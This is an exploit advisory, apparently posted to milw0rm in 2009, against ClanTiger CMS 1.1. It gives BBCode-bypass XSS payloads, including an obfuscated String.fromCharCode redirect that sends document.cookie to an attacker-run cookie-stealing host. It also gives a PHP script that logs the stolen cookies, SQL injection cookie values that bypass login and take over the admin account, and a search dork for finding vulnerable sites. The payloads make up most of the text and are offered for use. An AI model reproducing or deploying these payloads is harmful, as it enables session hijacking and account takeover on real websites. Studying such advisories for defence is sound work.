<html><head><title>ClanTiger < 1.1.1 Multiple Cookie Handling Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	  MULTIPLE COOKIES HANDLING VULNERABILITIES	            	     |
|--------------------------------------------------------------------------------------------|
|                         	     | CLAN TIGER CMS |		 			     |
|  CMS INFORMATION:		      ----------------					     |
|											     |
|--&gt;WEB: http://www.clantiger.com				   			     |
|--&gt;DOWNLOAD: http://www.clantiger.com/download-clan-cms 	   			     |
|--&gt;DEMO: http://www.demo.clantiger.com/						     |
|--&gt;CATEGORY: CMS / Portals								     |
|--&gt;DESCRIPTION: ClanTiger is a content management system specifically designed for gaiming  |
| 		clans...			     					     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3.0.8 and IE 6.0.29 (Default)					     |
|--&gt;DORK: &quot;Powered by ClanTiger&quot;							     |
|--&gt;CATEGORY: BYPASS-BBCODE/COOKIES STEALING &amp;&amp; COOKIE AUTH BYPASS/SQL INJECTION	     |
|--&gt;AFFECT VERSION: 1.1	(maybe &lt;= ?)							     |
|--&gt;Discovered Bug date: 2009-04-04							     |
|--&gt;Reported Bug date: 2009-04-04							     |
|--&gt;Fixed bug date: 2009-04-06								     |
|--&gt;Info patch (v-1.1.1): http://www.clantiger.com/news-and-blog/			     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
----------------------------------------------------------------------------------------------

//////////////////////////////////

COOKIES STEALING (BYPASS BBCODE)

//////////////////////////////////

(I fucked BBCode again...)

-----------
BUG ZONES:
-----------

#BBCode is bypassed by differents methods and XSS is posible.

#We find BBCode on these links:

http://[HOST]/[PATH]/index.php?module=news&amp;action=view&amp;id=2
http://[HOST]/[PATH]/index.php?module=mycontrolpanel&amp;action=signature
http://[HOST]/[PATH]/index.php?module=news&amp;action=view&amp;id=2
http://[HOST]/[PATH]/index.php?module=forum
http://[HOST]/[PATH]/index.php?module=mymessages

----------------------------------
PROOF OF CONCEPT (SEARCHING XSS):
----------------------------------

BOTH (FIREFOX AND IE):

[url][img]http://www.google.es onmouseover=alert(1) [/img][/url]
[email][img]pepe@pepe.es onmouseover=alert(1) [/img][/email]
[email][url]http://www.prueba.es onmouseover=alert(1) [/url][/email]
[url][email]pepe@pepe.es onmouseover=alert(1) [/email][/url]

...

ONLY IE:

[img][url]http://al.com onmouseover=alert(1) [/url][/img]
[img][email]pepe@pepe.es onmouseover=alert(1) [/email][/img]

...

Combinations of tags: 

[email][url]http://owned.com onmouseover=alert(1) [/url][/mail]

Generate:

&lt;a href=&quot;mailto:&lt;a href=&quot;http://owned.com onmouseover=alert(1) &quot; target=&quot;_blank&quot;&gt;http://owned.com onmouseover=alert(1) &lt;/a&gt;&quot;&gt;&lt;a href=&quot;http://owned.com onmouseover=alert(1) &quot; target=&quot;_blank&quot;&gt;http://owned.com onmouseover=alert(1) &lt;/a&gt;&lt;/a&gt;

--------------------------
COOKIES EXPLOIT (BBCODE):
--------------------------

Link --&gt; http://www.myphpcookiestealing.es/capturethecookies.php?ck=

[url][img]http://www.victim.es onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/url]

------------------------------
COOKIES STEALER (PHP SCRIPT):
------------------------------

&lt;?php
$ck=$_GET[&quot;ck&quot;]; //Capture the cookies	 
$manejador=fopen(&quot;exploited.txt&quot;,'a'); //Open cookies saved file
fwrite($manejador, &quot;Cookie:\r\n&quot;.htmlentities($ck).&quot;\r\n--EOF--\r\n&quot;); //Save the values
fclose($manejador);	//Close file
echo &quot;&lt;script&gt;location.href='http://[HOST]/[PATH]/index.php?module';&lt;/script&gt;&quot;; //Redirect...we don't want to alert xDD
?&gt;

Remember: You can use any cookie editor and you have one nice shot (XSSSHEll+XSSTunnel = many nice shots xD)

///////////////////////////////////

[COOKIE]AUTH BYPASS(SQL INJECTION)

///////////////////////////////////

But, my world isn't Only BBcode :P

------------
CONDITIONS:
------------

**(sometimes) DB_PREFIX=&quot;&quot; (Default) 

	maybe: db, db_clan, ...

**gpc_magic_quotes=off

-----------
BUG FILE:
-----------

Path --&gt; [HOME_PATH]/functions/class.accesscontrol.php

It contents:

	function checkLogin()
	{
		if($_COOKIE['CCC_UID'] &amp;&amp; $_COOKIE['CCC_CODE'])
		{
			$uid = $_COOKIE['CCC_UID'];
			$logincode = $_COOKIE['CCC_CODE'];
			
			$query = &quot;SELECT * FROM &quot; . DB_PREFIX . &quot;members WHERE md5(id)='$uid' and logincode='$logincode'&quot;;
			$results = $this-&gt;db-&gt;getrow($query);

			if($results['username'])
			{
				
				....
			}	

			
		} 
	}

----------------------------------
PROOF OF CONCEPT (SQL INJECTION):
----------------------------------

Add cookies:

CCC_UID=BLABLABLA   //it is not use
CCC_CODE=BLABLA' [SQL]

---------
EXAMPLE:
---------

Add cookies: (only need gpc_magic_quotes=off)

CCC_UID=pepe	//it is not use
CCC_CODE=lala' OR 1=1 /*	//admin 

Other example: (DB_PREFIX=&quot;&quot; and gpc_magic_quotes=off)

CCC_UID=pepe	//it is not use
CCC_CODE=lala' UNION ALL SELECT * FROM members WHERE id='1	//select first user= admin? maybe we want to be other (id=2,3,4...) :P

*******************************************************************
 ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
*******************************************************************
-------------------------------------------------------------------
*******************************************************************
 GREETZ TO: JosS and all spanish Hack3Rs community!
*******************************************************************

-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!

# milw0rm.com [2009-04-17]</pre></html>